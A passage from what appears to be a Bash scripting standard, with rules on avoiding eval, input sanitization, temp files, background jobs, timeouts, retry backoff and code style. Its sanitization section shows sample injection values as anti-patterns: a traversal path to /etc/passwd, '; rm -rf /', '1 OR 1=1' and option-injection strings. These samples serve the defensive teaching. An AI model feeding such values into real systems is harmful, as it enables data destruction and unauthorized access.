  start_service
}

status_service() {
  info "${config[app_name]} is running"
}

build_curl_command() {
  local -- url="$1"
  local -a curl_cmd=(curl)

  [[ -v config[proxy] ]] && curl_cmd+=(--proxy "${config[proxy]}")
  [[ -v config[timeout] ]] && curl_cmd+=(--timeout "${config[timeout]}")
  curl_cmd+=("$url")

  "${curl_cmd[@]}"
}

main() {
  local -- action="${1:-status}"

  if [[ -v "actions[$action]" ]]; then
    "${actions[$action]}"
  else
    die 22 "Invalid action: $action. Valid: ${!actions[*]}"
  fi
}

main "$@"

#fin
```

**Summary:**

- **Never use eval with untrusted input** - no exceptions
- **Avoid eval entirely** - better alternatives exist for almost all use cases
- **Use arrays** for dynamic command construction: `cmd=(find); cmd+=(-name "*.txt"); "${cmd[@]}"`
- **Use indirect expansion** for variable references: `echo "${!var_name}"`
- **Use associative arrays** for dynamic data: `declare -A data; data[$key]=$value`
- **Use case/arrays** for function dispatch instead of eval
- **Validate strictly** if eval is absolutely unavoidable (which it almost never is)
- **Enable ShellCheck** to catch eval misuse

**Key principle:** If you think you need `eval`, you're solving the wrong problem. There is almost always a safer alternative using proper Bash features like arrays, indirect expansion, or associative arrays.


---


**Rule: BCS1005**

## Input Sanitization

**Always validate and sanitize user input to prevent security issues.**

**Rationale:**
- Prevent injection attacks and directory traversal (`../../../etc/passwd`)
- Validate data types and fail early before processing
- Defense in depth: never trust user input

**1. Filename validation:**

```bash
# Validate filename - no directory traversal, no special chars
sanitize_filename() {
  local -- name="$1"

  # Reject empty input
  [[ -n "$name" ]] || die 22 'Filename cannot be empty'

  # Remove directory traversal attempts
  name="${name//\.\./}"  # Remove all ..
  name="${name//\//}"    # Remove all /

  # Allow only safe characters: alphanumeric, dot, underscore, hyphen
  if [[ ! "$name" =~ ^[a-zA-Z0-9._-]+$ ]]; then
    die 22 "Invalid filename '$name': contains unsafe characters"
  fi

  # Reject hidden files (starting with .)
  [[ "$name" =~ ^\. ]] && die 22 "Filename cannot start with dot: $name"

  # Reject names that are too long
  ((${#name} > 255)) && die 22 "Filename too long (max 255 chars): $name"

  echo "$name"
}

# Usage
user_filename=$(sanitize_filename "$user_input")
safe_path="$SAFE_DIR/$user_filename"
```

**2. Numeric input validation:**

```bash
# Validate integer (positive or negative)
validate_integer() {
  local -- input="$1"
  [[ -n "$input" ]] || die 22 'Number cannot be empty'

  if [[ ! "$input" =~ ^-?[0-9]+$ ]]; then
    die 22 "Invalid integer: '$input'"
  fi
  echo "$input"
}

# Validate positive integer
validate_positive_integer() {
  local -- input="$1"
  [[ -n "$input" ]] || die 22 'Number cannot be empty'

  if [[ ! "$input" =~ ^[0-9]+$ ]]; then
    die 22 "Invalid positive integer: '$input'"
  fi

  # Check for leading zeros (often indicates octal interpretation)
  [[ "$input" =~ ^0[0-9] ]] && die 22 "Number cannot have leading zeros: $input"

  echo "$input"
}

# Validate with range check
validate_port() {
  local -- port="$1"
  port=$(validate_positive_integer "$port")

  ((port >= 1 && port <= 65535)) || die 22 "Port must be 1-65535: $port"
  echo "$port"
}
```

**3. Path validation:**

```bash
# Validate path is within allowed directory
validate_path() {
  local -- input_path="$1"
  local -- allowed_dir="$2"

  # Resolve to absolute path
  local -- real_path
  real_path=$(realpath -e -- "$input_path") || die 22 "Invalid path: $input_path"

  # Ensure path is within allowed directory
  if [[ "$real_path" != "$allowed_dir"* ]]; then
    die 5 "Path outside allowed directory: $real_path"
  fi

  echo "$real_path"
}

# Usage
safe_path=$(validate_path "$user_path" "/var/app/data")
```

**4. Email validation:**

```bash
validate_email() {
  local -- email="$1"
  [[ -n "$email" ]] || die 22 'Email cannot be empty'

  # Basic email regex (not RFC-compliant but sufficient for most cases)
  local -- email_regex='^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'

  if [[ ! "$email" =~ $email_regex ]]; then
    die 22 "Invalid email format: $email"
  fi

  # Check length limits
  ((${#email} <= 254)) || die 22 "Email too long (max 254 chars): $email"

  echo "$email"
}
```

**5. URL validation:**

```bash
validate_url() {
  local -- url="$1"
  [[ -n "$url" ]] || die 22 'URL cannot be empty'

  # Only allow http and https schemes
  if [[ ! "$url" =~ ^https?:// ]]; then
    die 22 "URL must start with http:// or https://: $url"
  fi

  # Reject URLs with credentials (security risk)
  if [[ "$url" =~ @ ]]; then
    die 22 'URL cannot contain credentials'
  fi

  echo "$url"
}
```

**6. Whitelist validation:**

```bash
# Validate input against whitelist
validate_choice() {
  local -- input="$1"
  shift
  local -a valid_choices=("$@")

  local choice
  for choice in "${valid_choices[@]}"; do
    [[ "$input" == "$choice" ]] && return 0
  done

  die 22 "Invalid choice '$input'. Valid: ${valid_choices[*]}"
}

# Usage
declare -a valid_actions=('start' 'stop' 'restart' 'status')
validate_choice "$user_action" "${valid_actions[@]}"
```

**7. Username validation:**

```bash
validate_username() {
  local -- username="$1"
  [[ -n "$username" ]] || die 22 'Username cannot be empty'

  # Standard Unix username rules
  if [[ ! "$username" =~ ^[a-z_][a-z0-9_-]*$ ]]; then
    die 22 "Invalid username: $username"
  fi

  # Check length (typically max 32 chars on Unix)
  ((${#username} >= 1 && ${#username} <= 32)) || \
    die 22 "Username must be 1-32 characters: $username"

  echo "$username"
}
```

**8. Command injection prevention:**

```bash
# NEVER pass user input directly to shell
#  DANGEROUS - command injection vulnerability
user_file="$1"
cat "$user_file"  # If user_file="; rm -rf /", disaster!

#  Safe - validate first
validate_filename "$user_file"
cat -- "$user_file"  # Use -- to prevent option injection

#  DANGEROUS - using eval with user input
eval "$user_command"  # NEVER DO THIS!

#  Safe - whitelist allowed commands
case "$user_command" in
  start|stop|restart) systemctl "$user_command" myapp ;;
  *) die 22 "Invalid command: $user_command" ;;
esac
```

**9. Option injection prevention:**

```bash
# User input could be malicious option like "--delete-all"
user_file="$1"

#  Dangerous - if user_file="--delete-all", disaster!
rm "$user_file"

#  Safe - use -- separator
rm -- "$user_file"

#  Dangerous - filename starting with -
ls "$user_file"  # If user_file="-la", becomes: ls -la

#  Safe - use -- or prepend ./
ls -- "$user_file"
ls ./"$user_file"
```

**10. SQL injection prevention (if generating SQL):**

```bash
#  DANGEROUS - SQL injection vulnerability
user_id="$1"
query="SELECT * FROM users WHERE id=$user_id"  # user_id="1 OR 1=1"

#  Safe - validate input type first
user_id=$(validate_positive_integer "$user_id")
query="SELECT * FROM users WHERE id=$user_id"

#  Better - use parameterized queries (with proper DB tools)
# This is just bash demo - use proper DB library in production
```

**Complete validation example:**

```bash
#!/usr/bin/env bash
set -euo pipefail

# Validation functions
validate_positive_integer() {
  local input="$1"
  [[ -n "$input" && "$input" =~ ^[0-9]+$ ]] || \
    die 22 "Invalid positive integer: $input"
  echo "$input"
}

sanitize_filename() {
  local name="$1"
  name="${name//\.\./}"
  name="${name//\//}"
  [[ "$name" =~ ^[a-zA-Z0-9._-]+$ ]] || \
    die 22 "Invalid filename: $name"
  echo "$name"
}

# Parse and validate arguments
while (($#)); do case $1 in
  -c|--count)     noarg "$@"; shift
                  count=$(validate_positive_integer "$1") ;;
  -f|--file)      noarg "$@"; shift
                  filename=$(sanitize_filename "$1") ;;
  -*)             die 22 "Invalid option: $1" ;;
  *)              die 2 "Unexpected argument: $1" ;;
esac; shift; done

# Validate required arguments provided
[[ -n "${count:-}" ]] || die 2 'Missing required option: --count'
[[ -n "${filename:-}" ]] || die 2 'Missing required option: --file'

# Use validated input safely
for ((i=0; i<count; i+=1)); do
  echo "Processing iteration $i" >> "$filename"
done
```

**Critical anti-patterns:**

```bash
#  WRONG - trusting user input
rm -rf "$user_dir"  # user_dir="/" = disaster!

#  Correct - validate first
validate_path "$user_dir" "/safe/base/dir"
rm -rf "$user_dir"

#  WRONG - blacklist approach (always incomplete)
[[ "$input" != *'rm'* ]] || die 1 'Invalid input'  # Can be bypassed!

#  Correct - whitelist approach
[[ "$input" =~ ^[a-zA-Z0-9]+$ ]] || die 1 'Invalid input'
```

**Security principles:**
1. **Whitelist over blacklist**: Define what IS allowed, not what isn't
2. **Validate early**: Check input before any processing
3. **Fail securely**: Reject invalid input with clear error
4. **Use `--` separator**: Prevent option injection in commands
5. **Never use `eval`**: Especially not with user input
6. **Absolute paths**: Use full paths to prevent PATH manipulation
7. **Principle of least privilege**: Run with minimum necessary permissions


---


**Rule: BCS1006**

## Temporary File Handling

**Always use `mktemp` for temp files/directories, never hard-code paths. Use trap EXIT handlers to ensure cleanup occurs even on failure/interruption. Proper temp file handling prevents security vulnerabilities, file collisions, and resource leaks.**

**Rationale:**

- **Security**: mktemp creates files with 0600 permissions in safe locations atomically, preventing race conditions
- **Uniqueness**: Guaranteed unique filenames prevent collisions
- **Cleanup Guarantee**: EXIT trap ensures cleanup even when script fails or is interrupted
- **Portability**: mktemp works consistently across Unix-like systems

**Basic temp file creation:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

#  CORRECT - Create temp file and ensure cleanup
create_temp_file() {
  local -- temp_file

  temp_file=$(mktemp) || die 1 'Failed to create temporary file'
  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  info "Created temp file: $temp_file"

  echo 'Test data' > "$temp_file"
  cat "$temp_file"
}

main() {
  create_temp_file
}

main "$@"

#fin
```

**Basic temp directory creation:**

```bash
create_temp_dir() {
  local -- temp_dir

  temp_dir=$(mktemp -d) || die 1 'Failed to create temporary directory'
  trap 'rm -rf "$temp_dir"' EXIT
  readonly -- temp_dir

  info "Created temp directory: $temp_dir"

  echo 'file1' > "$temp_dir/file1.txt"
  echo 'file2' > "$temp_dir/file2.txt"

  ls -la "$temp_dir"
}
```

**Custom temp file templates:**

```bash
#  CORRECT - Temp file with custom template
create_custom_temp() {
  local -- temp_file

  # Template: myapp.XXXXXX (at least 3 X's required)
  temp_file=$(mktemp /tmp/"$SCRIPT_NAME".XXXXXX) ||
    die 1 'Failed to create temporary file'

  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  info "Created temp file: $temp_file"
  # Output example: /tmp/myscript.Ab3X9z

  echo 'Data' > "$temp_file"
}

#  CORRECT - Temp file with extension
create_temp_with_extension() {
  local -- temp_file

  # mktemp doesn't support extensions directly, so add it
  temp_file=$(mktemp /tmp/"$SCRIPT_NAME".XXXXXX)
  mv "$temp_file" "$temp_file.json"
  temp_file="$temp_file.json"

  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  echo '{"key": "value"}' > "$temp_file"
}
```

**Multiple temp files with cleanup:**

```bash
# Global array for temp files
declare -a TEMP_FILES=()

# Cleanup function for all temp files
cleanup_temp_files() {
  local -i exit_code=$?
  local -- file

  if [[ ${#TEMP_FILES[@]} -gt 0 ]]; then
    info "Cleaning up ${#TEMP_FILES[@]} temporary files"

    for file in "${TEMP_FILES[@]}"; do
      if [[ -f "$file" ]]; then
        rm -f "$file"
      elif [[ -d "$file" ]]; then
        rm -rf "$file"
      fi
    done
  fi

  return "$exit_code"
}

# Set up cleanup trap
trap cleanup_temp_files EXIT

# Create and register temp file
create_temp() {
  local -- temp_file

  temp_file=$(mktemp) || die 1 'Failed to create temporary file'
  TEMP_FILES+=("$temp_file")

  echo "$temp_file"
}

main() {
  local -- temp1 temp2 temp_dir

  # Create multiple temp files
  temp1=$(create_temp)
  temp2=$(create_temp)
  temp_dir=$(create_temp_dir)

  readonly -- temp1 temp2 temp_dir

  # Use temp files
  echo 'Data 1' > "$temp1"
  echo 'Data 2' > "$temp2"
}
```

**Temp file security validation:**

```bash
#  CORRECT - Robust temp file creation with validation
create_temp_robust() {
  local -- temp_file

  if ! temp_file=$(mktemp 2>&1); then
    die 1 "Failed to create temporary file: $temp_file"
  fi

  # Validate temp file was created
  if [[ ! -f "$temp_file" ]]; then
    die 1 "Temp file does not exist: $temp_file"
  fi

  # Check permissions (should be 0600)
  local -- perms
  perms=$(stat -c %a "$temp_file" 2>/dev/null || stat -f %Lp "$temp_file" 2>/dev/null)
  if [[ "$perms" != '600' ]]; then
    rm -f "$temp_file"
    die 1 "Temp file has insecure permissions: $perms"
  fi

  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  echo "$temp_file"
}
```

**Anti-patterns:**

```bash
#  WRONG - Hard-coded temp file path
temp_file="/tmp/myapp_temp.txt"
echo 'data' > "$temp_file"
# Problems: Not unique, predictable name, no automatic cleanup

#  CORRECT
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

#  WRONG - Using PID in filename
temp_file="/tmp/myapp_$$.txt"
# Problems: Still predictable, race condition, no cleanup

#  WRONG - No cleanup trap
temp_file=$(mktemp)
echo 'data' > "$temp_file"
# Script exits, temp file remains!

#  WRONG - Cleanup in script body
temp_file=$(mktemp)
echo 'data' > "$temp_file"
rm -f "$temp_file"
# If script fails before rm, file remains!

#  CORRECT - Cleanup in trap
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

#  WRONG - Not checking mktemp success
temp_file=$(mktemp)
echo 'data' > "$temp_file"  # May fail if mktemp failed!

#  WRONG - Multiple traps overwrite each other
temp1=$(mktemp)
trap 'rm -f "$temp1"' EXIT

temp2=$(mktemp)
trap 'rm -f "$temp2"' EXIT  # Overwrites previous trap!
# temp1 won't be cleaned up!

#  CORRECT - Single trap for all cleanup
temp1=$(mktemp) || die 1 'Failed to create temp file'
temp2=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp1" "$temp2"' EXIT

#  BETTER - Cleanup function
declare -a TEMP_FILES=()
cleanup() {
  local -- file
  for file in "${TEMP_FILES[@]}"; do
    [[ -f "$file" ]] && rm -f "$file"
  done
}
trap cleanup EXIT

temp1=$(mktemp)
TEMP_FILES+=("$temp1")

#  WRONG - Removing temp directory without -r
temp_dir=$(mktemp -d)
trap 'rm "$temp_dir"' EXIT  # Fails if directory not empty!

#  CORRECT - Use -rf for directories
temp_dir=$(mktemp -d) || die 1 'Failed to create temp directory'
trap 'rm -rf "$temp_dir"' EXIT
```

**Edge cases:**

**1. Preserving temp files for debugging:**

```bash
declare -i KEEP_TEMP=0
declare -a TEMP_FILES=()

cleanup() {
  local -i exit_code=$?
  local -- file

  if ((KEEP_TEMP)); then
    if [[ ${#TEMP_FILES[@]} -gt 0 ]]; then
      info 'Keeping temp files for debugging:'
      for file in "${TEMP_FILES[@]}"; do
        info "  $file"
      done
    fi
  else
    for file in "${TEMP_FILES[@]}"; do
      [[ -f "$file" ]] && rm -f "$file"
      [[ -d "$file" ]] && rm -rf "$file"
    done
  fi

  return "$exit_code"
}

trap cleanup EXIT
```

**2. Temp files in specific directory:**

```bash
# Create temp file in specific directory
temp_file=$(mktemp "$SCRIPT_DIR/temp.XXXXXX") ||
  die 1 'Failed to create temp file in script directory'

trap 'rm -f "$temp_file"' EXIT

# Create temp directory in specific location
temp_dir=$(mktemp -d "$HOME/work/temp.XXXXXX") ||
  die 1 'Failed to create temp directory'

trap 'rm -rf "$temp_dir"' EXIT
```

**3. Handling signals:**

```bash
declare -- TEMP_FILE=''

cleanup() {
  local -i exit_code=$?

  if [[ -n "$TEMP_FILE" && -f "$TEMP_FILE" ]]; then
    rm -f "$TEMP_FILE"
  fi

  return "$exit_code"
}

# Cleanup on normal exit and signals
trap cleanup EXIT SIGINT SIGTERM

main() {
  TEMP_FILE=$(mktemp) || die 1 'Failed to create temp file'
  readonly -- TEMP_FILE

  # Simulate long-running operation
  local -i i
  for ((i=1; i<=60; i+=1)); do
    echo "Working... $i"
    sleep 1
  done
}
```

**Summary:**

- **Always use mktemp** - never hard-code temp file paths
- **Use trap EXIT for cleanup** - ensure cleanup happens even on failure
- **Check mktemp success** - `|| die` to handle creation failure
- **Default permissions are secure** - 0600 files, 0700 directories
- **Single trap for all cleanup** - use cleanup function for multiple resources
- **Template support** - `mktemp /tmp/prefix.XXXXXX` for recognizable names
- **Keep variables readonly** - prevent accidental modification
- **--keep-temp option** - useful for debugging
- **Signal handling** - trap SIGINT SIGTERM for interruption cleanup

**Key principle:** Temp files are a common source of security vulnerabilities and resource leaks. Always use mktemp (never hard-code paths), always use trap EXIT (never rely on manual cleanup). The combination of mktemp + trap EXIT is the gold standard - it's atomic, secure, and guarantees cleanup even when scripts fail or are interrupted.


---


**Rule: BCS1100**

# Concurrency & Jobs

Parallel execution patterns, background job management, and robust waiting strategies for Bash 5.2+.

**5 Rules:**

1. **Background Jobs** (BCS1101) - Managing `&`, process groups, and cleanup
2. **Parallel Execution** (BCS1102) - Running tasks concurrently with output capture
3. **Wait Patterns** (BCS1103) - `wait -n`, error collection, selective waiting
4. **Timeout Handling** (BCS1104) - Using `timeout` command, exit codes 124/125
5. **Exponential Backoff** (BCS1105) - Retry patterns with increasing delays

**Key principle:** Always clean up background jobs and handle partial failures gracefully.


---


**Rule: BCS1101**

## Background Job Management

**Rule: BCS1406**

Managing background processes, job control, and process lifecycle.

---

#### Rationale

Background jobs enable non-blocking execution, parallel processing, responsive scripts, and proper resource cleanup on termination.

---

#### Starting Background Jobs

```bash
# Basic background execution
long_running_command &
declare -i pid=$!

# Track multiple jobs
declare -a pids=()
for file in "${files[@]}"; do
  process_file "$file" &
  pids+=($!)
done
```

#### Checking Process Status

```bash
# Check if process is running (signal 0 = existence check)
if kill -0 "$pid" 2>/dev/null; then
  info "Process $pid is still running"
fi

# Get process state from /proc
if [[ -d /proc/$pid ]]; then
  state=$(< /proc/$pid/stat)
fi
```

#### Waiting for Jobs

```bash
wait "$pid"           # Wait for specific PID
exit_code=$?
wait                  # Wait for all background jobs
wait -n               # Wait for any job to complete (Bash 4.3+)
```

#### Cleanup Pattern

```bash
declare -a PIDS=()

cleanup() {
  local -i exitcode=${1:-0}
  trap - SIGINT SIGTERM EXIT  # Prevent recursion

  for pid in "${PIDS[@]}"; do
    kill "$pid" 2>/dev/null || true
  done
  exit "$exitcode"
}
trap 'cleanup $?' SIGINT SIGTERM EXIT

for task in "${tasks[@]}"; do
  run_task "$task" &
  PIDS+=($!)
done

for pid in "${PIDS[@]}"; do
  wait "$pid" || true
done
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - no PID tracking (cannot manage or wait later)
command &

# ✓ Correct - always track PIDs
command &
pid=$!
```

```bash
# ✗ Wrong - $$ is parent PID, not child
command &
echo "Started $$"

# ✓ Correct - use $! for last background PID
command &
echo "Started $!"
```

---

**See Also:** BCS1407 (Parallel Execution), BCS1408 (Wait Patterns), BCS1409 (Timeout Handling)

#fin


---


**Rule: BCS1102**

## Parallel Execution Patterns

**Rule: BCS1407**

Executing multiple commands concurrently while maintaining control and collecting results.

---

#### Rationale

Parallel execution provides significant speedup for I/O-bound tasks, better resource utilization, and efficient batch processing.

---

#### Basic Parallel Pattern

```bash
declare -a pids=()

# Start jobs in parallel
for server in "${servers[@]}"; do
  run_command "$server" "$@" &
  pids+=($!)
done

# Wait for all to complete
for pid in "${pids[@]}"; do
  wait "$pid" || true
done
```

#### Parallel with Output Capture

```bash
declare -- temp_dir
temp_dir=$(mktemp -d)
trap 'rm -rf "$temp_dir"' EXIT

declare -a pids=()

for server in "${servers[@]}"; do
  {
    result=$(run_command "$server" 2>&1)
    echo "$result" > "$temp_dir/$server.out"
  } &
  pids+=($!)
done

# Wait then display in order
for pid in "${pids[@]}"; do
  wait "$pid" || true
done

for server in "${servers[@]}"; do
  [[ -f "$temp_dir/$server.out" ]] && cat "$temp_dir/$server.out"
done
```

#### Parallel with Concurrency Limit

```bash
declare -i max_jobs=4
declare -a pids=()

for task in "${tasks[@]}"; do
  while ((${#pids[@]} >= max_jobs)); do
    wait -n 2>/dev/null || true
    local -a active=()
    for pid in "${pids[@]}"; do
      kill -0 "$pid" 2>/dev/null && active+=("$pid")
    done
    pids=("${active[@]}")
  done

  process_task "$task" &
  pids+=($!)
done

wait
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - variable lost in subshell
count=0
for task in "${tasks[@]}"; do
  { process "$task"; ((count+=1)); } &
done
wait
echo "$count"  # Always 0!

# ✓ Correct - use temp files for results
for task in "${tasks[@]}"; do
  { process "$task" && echo 1 >> "$temp_dir/count"; } &
done
wait
count=$(wc -l < "$temp_dir/count")
```

---

**See Also:** BCS1406 (Background Jobs), BCS1408 (Wait Patterns)

#fin


---


**Rule: BCS1103**

## Wait Patterns

**Rule: BCS1408**

Proper synchronization when waiting for background processes.

---

#### Rationale

Ensures resource cleanup, correct exit code capture, prevents hanging on failed processes, and graceful interrupt handling.

---

#### Basic Wait

```bash
# Wait for specific PID and capture exit code
command &
pid=$!
wait "$pid"
exit_code=$?
```

#### Wait for All Jobs

```bash
# Wait for all background jobs
wait

# With error tracking
declare -i errors=0
for pid in "${pids[@]}"; do
  wait "$pid" || ((errors+=1))
done
((errors)) && warn "$errors jobs failed"
```

#### Wait for Any (Bash 4.3+)

```bash
# Wait for first job to complete
declare -a pids=()
for task in "${tasks[@]}"; do
  process_task "$task" &
  pids+=($!)
done

# Process as they complete
while ((${#pids[@]} > 0)); do
  wait -n
  exit_code=$?
  # Handle completion...

  # Update active PIDs list
  local -a active=()
  for pid in "${pids[@]}"; do
    kill -0 "$pid" 2>/dev/null && active+=("$pid")
  done
  pids=("${active[@]}")
done
```

#### Wait with Error Collection

```bash
declare -A exit_codes=()

for server in "${servers[@]}"; do
  run_command "$server" &
  exit_codes[$server]=$!
done

declare -i failures=0
for server in "${!exit_codes[@]}"; do
  pid=${exit_codes[$server]}
  if ! wait "$pid"; then
    exit_codes[$server]=$?
    ((failures+=1))
  else
    exit_codes[$server]=0
  fi
done

((failures)) && error "$failures servers failed"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - ignoring wait return value
command &
wait $!  # Exit code lost

# ✓ Correct - capture and use exit code
command &
wait $! || die 1 'Command failed'
```

---

**See Also:** BCS1406 (Background Jobs), BCS1407 (Parallel Execution)

#fin


---


**Rule: BCS1104**

## Timeout Handling

**Rule: BCS1409**

Managing command timeouts and handling timeout conditions gracefully.

---

#### Rationale

Timeout handling prevents scripts hanging on unresponsive commands, resource exhaustion from stuck processes, poor UX with indefinite waits, and cascading failures in automation.

---

#### Basic Timeout

```bash
# Simple timeout (coreutils)
if timeout 30 long_running_command; then
  success 'Command completed'
else
  exit_code=$?
  if ((exit_code == 124)); then
    warn 'Command timed out'
  else
    error "Command failed with exit code $exit_code"
  fi
fi
```

#### Timeout with Signal Selection

```bash
# Send SIGTERM first, SIGKILL after grace period
timeout --signal=TERM --kill-after=10 60 command

# Common timeout exit codes:
# 124 - command timed out
# 125 - timeout command itself failed
# 126 - command found but not executable
# 127 - command not found
# 137 - killed by SIGKILL (128 + 9)
```

#### Timeout with Variable Duration

```bash
declare -i TIMEOUT=${TIMEOUT:-30}

run_with_timeout() {
  local -i timeout_sec=$1; shift

  if ! timeout "${timeout_sec}s" "$@"; then
    local -i exit_code=$?
    case $exit_code in
      124) warn "Timed out after ${timeout_sec}s" ;;
      125) error 'Timeout command failed' ;;
      *)   error "Failed with exit code $exit_code" ;;
    esac
    return "$exit_code"
  fi
}

run_with_timeout "$TIMEOUT" ssh "$server" "$command"
```

#### Read with Timeout

```bash
# User input with timeout
if read -r -t 10 -p 'Enter value: ' value; then
  info "Got: $value"
else
  warn 'Input timed out, using default'
  value='default'
fi
```

#### Connection Timeout Pattern

```bash
# SSH with connection timeout
ssh -o ConnectTimeout=10 -o BatchMode=yes "$server" "$command"

# curl with timeout
curl --connect-timeout 10 --max-time 60 "$url"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - no timeout on network operations
ssh "$server" 'long_command'  # May hang forever

# ✓ Correct - always timeout network operations
timeout 300 ssh -o ConnectTimeout=10 "$server" 'long_command'
```

---

**See Also:** BCS1410 (Exponential Backoff)

#fin


---


**Rule: BCS1105**

## Exponential Backoff

**Rule: BCS1410**

Retry logic with exponential delay for transient failures.

---

#### Rationale

- Graceful handling of transient failures with automatic recovery
- Reduced load on failing services (prevents flooding)
- Configurable retry behavior

---

#### Basic Exponential Backoff

```bash
retry_with_backoff() {
  local -i max_attempts=${1:-5}
  local -i attempt=1
  shift

  while ((attempt <= max_attempts)); do
    if "$@"; then
      return 0
    fi

    local -i delay=$((2 ** attempt))
    warn "Attempt $attempt failed, retrying in ${delay}s..."
    sleep "$delay"
    ((attempt+=1))
  done

  error "Failed after $max_attempts attempts"
  return 1
}

retry_with_backoff 5 curl -f "$url"
```

#### With Maximum Delay Cap

```bash
retry_with_backoff() {
  local -i max_attempts=5
  local -i max_delay=60
  local -i attempt=1

  while ((attempt <= max_attempts)); do
    if "$@"; then
      return 0
    fi

    local -i delay=$((2 ** attempt))
    ((delay > max_delay)) && delay=$max_delay

    ((VERBOSE)) && info "Retry $attempt in ${delay}s..."
    sleep "$delay"
    ((attempt+=1))
  done

  return 1
}
```

#### With Jitter (Randomization)

```bash
# Add randomization to prevent thundering herd
retry_with_jitter() {
  local -i max_attempts=5
  local -i attempt=1

  while ((attempt <= max_attempts)); do
    if "$@"; then
      return 0
    fi

    local -i base_delay=$((2 ** attempt))
    local -i jitter=$((RANDOM % base_delay))
    local -i delay=$((base_delay + jitter))

    sleep "$delay"
    ((attempt+=1))
  done

  return 1
}
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - fixed delay
while ! command; do
  sleep 5  # Same delay every time
done

# ✓ Correct - exponential backoff
attempt=1
while ! command; do
  sleep $((2 ** attempt))
  ((attempt+=1))
  ((attempt > 5)) && break
done
```

```bash
# ✗ Wrong - immediate retry floods service
while ! curl "$url"; do :; done

# ✓ Correct - backoff prevents flooding
retry_with_backoff 5 curl -f "$url"
```

---

**See Also:** BCS1409 (Timeout Handling), BCS1406 (Background Jobs)

#fin


---


**Rule: BCS1200**

# Style & Development

Code formatting, documentation, and development patterns for maintainable Bash scripts.

**10 Rules:**

1. **Code Formatting** (BCS1201) - Indentation, line length, structure
2. **Comments** (BCS1202) - Comment style and placement
3. **Blank Lines** (BCS1203) - Whitespace for readability
4. **Section Markers** (BCS1204) - Visual section delimiters
5. **Language Practices** (BCS1205) - Bash-specific idioms
6. **Development Practices** (BCS1206) - Version control, testing habits
7. **Debugging** (BCS1207) - Debug output and tracing
8. **Dry-Run Mode** (BCS1208) - Safe preview of destructive operations
9. **Testing** (BCS1209) - Test structure and assertions
10. **Progressive State** (BCS1210) - Multi-stage operation tracking

**Key principle:** Consistent formatting and documentation make scripts maintainable by both humans and AI assistants.


---


**Rule: BCS1201**

## Code Formatting

#### Indentation
- !! Use 2 spaces for indentation (NOT tabs)
- Maintain consistent indentation throughout

#### Line Length
- Keep lines under 100 characters when practical
- Long file paths and URLs can exceed 100 chars when necessary
- Use line continuation with `\` for long commands


---


**Rule: BCS1202**

## Comments

Focus comments on **WHY** (rationale, business logic, non-obvious decisions) rather than **WHAT** (which the code already shows):

```bash
# Section separator (80 dashes)
# --------------------------------------------------------------------------------

# ✓ Good - explains WHY (rationale and special cases)
# PROFILE_DIR intentionally hardcoded to /etc/profile.d for system-wide bash profile
# integration, regardless of PREFIX. This ensures builtins are available in all
# user sessions. To override, modify this line or use a custom install method.
declare -- PROFILE_DIR=/etc/profile.d

((max_depth > 0)) || max_depth=255  # -1 means unlimited (WHY -1 is special)

# If user explicitly requested --builtin, try to install dependencies
if ((BUILTIN_REQUESTED)); then
  warn 'bash-builtins package not found, attempting to install...'
fi

# ✗ Bad - restates WHAT the code already shows
# Set PROFILE_DIR to /etc/profile.d
declare -- PROFILE_DIR=/etc/profile.d

# Check if max_depth is greater than 0, otherwise set to 255
((max_depth > 0)) || max_depth=255

# If BUILTIN_REQUESTED is non-zero
if ((BUILTIN_REQUESTED)); then
  # Print warning message
  warn 'bash-builtins package not found, attempting to install...'
fi
```

**Good comment patterns:** Explain non-obvious business rules/edge cases, intentional deviations, complex logic, alternative approaches, subtle gotchas/side effects.

**Avoid commenting:** Simple assignments, obvious conditionals, standard patterns, self-explanatory code with good naming.

**Emoticons:** In documentation, use standardized icons:

     info    ◉
     debug   ⦿
     warn    ▲
     success ✓
     error   ✗

Avoid other icons/emoticons unless justified.


---


**Rule: BCS1203**

## Blank Line Usage

Use blank lines to create visual separation between logical blocks:

```bash
#!/bin/bash
set -euo pipefail

# Script metadata
declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*}
                                          # � Blank line after metadata group

# Default values                          # � Blank line before section comment
declare -- PREFIX=/usr/local
declare -i DRY_RUN=0
                                          # � Blank line after variable group

# Derived paths
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
                                          # � Blank line before function
check_prerequisites() {
  info 'Checking prerequisites...'

  # Check for gcc                         # � Blank line after info call
  if ! command -v gcc &> /dev/null; then
    die 1 "'gcc' compiler not found."
  fi

  success 'Prerequisites check passed'    # � Blank line between checks
}
                                          # � Blank line between functions
main() {
  check_prerequisites
  install_files
}

main "$@"
#fin
```

**Guidelines:**
- One blank line between functions
- One blank line between logical sections within functions
- One blank line after section comments
- One blank line between variable groups
- Blank lines before/after multi-line conditionals or loops
- Avoid multiple consecutive blank lines
- No blank line between short, related statements


---


**Rule: BCS1204**

## Section Comments

Use lightweight section comments to organize code into logical groups:

```bash
# Default values
declare -- PREFIX=/usr/local
declare -i VERBOSE=1
declare -i DRY_RUN=0

# Derived paths
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
declare -- DOC_DIR="$PREFIX"/share/doc

# Core message function
_msg() {
